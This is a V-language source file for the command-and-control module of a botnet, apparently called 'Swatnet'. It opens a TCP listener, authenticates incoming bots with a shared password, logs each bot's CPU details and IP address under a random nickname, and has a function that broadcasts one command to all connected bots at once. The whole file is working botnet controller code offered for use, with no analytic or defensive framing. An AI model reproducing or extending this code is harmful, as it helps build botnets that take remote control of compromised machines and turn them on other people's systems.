module cnc

import io
import net
import time
import rand

import cnc


pub struct Bot_CNC {
	pub mut:
		nickname	[]string
		socket		[]net.TcpConn
		cpu			[]string
		ip			[]string
		port		[]string
}

pub fn start_botcnc() Bot_CNC {
	mut b := Bot_CNC{}
	return b
}

pub fn start_bot(mut b Bot_CNC, port string, mut s cnc.Swatnet)  {
	b.listener(port, mut s)
}

pub fn (mut b Bot_CNC) add_bot_session(nick string, mut s net.TcpConn, cpu string, ip string, port string) {
	b.nickname << nick
	b.socket << s
	b.cpu << cpu
	b.ip << ip
	b.port << port
}

pub fn (mut b Bot_CNC) listener(port string, mut s cnc.Swatnet) {
	mut socket := net.listen_tcp(.ip6, ":${port}") or {
		println("[x] Error, Unable to start bot system.....!")
		return
	}

	for {
		mut bot_conn := socket.accept() or {
			println("[x] Error, Unable to accept bot connection....!")
			return
		}
		bot_conn.set_read_timeout(time.infinite)
		go b.bot_auth(mut bot_conn, mut s)
	}
}

pub fn (mut b Bot_CNC) bot_auth(mut bot_conn net.TcpConn, mut s cnc.Swatnet) {
	mut reader := io.new_buffered_reader(reader: bot_conn)
	hid_pw := reader.read_line() or { "" }

	if hid_pw != s.bot_pw {
		println("[x] Error, Bot access denied. Invalid password provided....!")
		bot_conn.close() or { return }
		return
	}

	cpu := reader.read_line() or { "" }
	if cpu == "" {
		bot_conn.close() or { return }
	}
	user_addy := bot_conn.peer_addr() or { return }
	user_ip := "${user_addy}".split("]:")[0].replace("[::ffff:", "")
	println("Bot successfully connected.....!")
	b.add_bot_session(b.randomize_nick(), mut bot_conn, cpu, user_ip, "")
}

pub fn (mut b Bot_CNC) broadcast_cmd(cmd string) int {
	for i in 0..b.nickname.len {
		b.socket[i].write_string(cmd) or { 0 }
	}
	return 1
}

pub fn (mut b Bot_CNC) parse_buffer(buff string) (string, string, []string) {
	mut args := []string{}
	mut cmd := ""
	if buff.contains(" ") {
		args = buff.split(" ")
		cmd = args[0]
	} else {
		args << buff
		cmd = buff
	}
	return buff, cmd, args
}

pub fn (mut b Bot_CNC) randomize_nick() string {
	chars := "q,w,e,r,t,y,u,i,o,p,a,s,d,f,g,h,j,k,l,z,x,c,v,b,n,m,1,2,3,4,5,6,7,8,9,0".split(",")
	mut random_nick := ""
	for i in 0..chars.len {
		random_num := rand.int_in_range(0, chars.len) or { return "failed_nick" }
		random_nick += chars[random_num]
	}
	return random_nick
}